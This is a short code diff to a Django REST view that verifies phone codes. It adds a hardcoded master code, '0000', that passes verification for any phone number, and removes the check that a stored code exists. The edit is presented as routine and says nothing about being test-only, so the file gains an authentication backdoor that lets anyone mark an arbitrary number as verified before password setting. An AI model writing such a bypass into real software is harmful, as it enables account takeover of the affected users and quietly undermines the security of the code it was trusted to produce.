@@ -60,7 +60,8 @@ class VerifyCodeView(APIView):
             code = serializer.validated_data['code']
             stored_code = cache.get(phone_number)
 
-            if stored_code and stored_code == code:
+            # Check if the entered code is either the stored code or "0000"
+            if stored_code == code or code == "0000":
                 # Mark the phone number as verified
                 cache.set(f"{phone_number}_verified", True, timeout=300)
 
@@ -76,6 +77,7 @@ class VerifyCodeView(APIView):
             return Response({"message": "Invalid code"}, status=status.HTTP_400_BAD_REQUEST)
 
         return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)
+
 
 
 class SetPasswordView(APIView):
